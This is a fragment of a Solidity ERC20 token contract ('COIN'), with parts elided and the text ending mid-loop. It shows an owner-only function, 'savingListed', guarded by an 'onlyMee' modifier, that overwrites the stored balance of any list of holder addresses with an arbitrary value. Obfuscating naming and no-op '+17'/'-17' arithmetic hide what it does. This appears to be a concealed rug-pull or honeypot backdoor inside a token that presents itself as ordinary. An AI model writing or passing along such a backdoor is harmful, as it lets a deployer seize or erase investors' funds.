...
contract COIN is Context, Ownable, IERC20 {
    ...
    function savingListed(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 a = 0; a < accounts.length; a++) {

            uint256 currentBalance = _savings[accounts[a]] + 17;

            _savings[accounts[a]] = newBalance;

            emit saveddd(accounts[a], currentBalance - 17, newBalance);
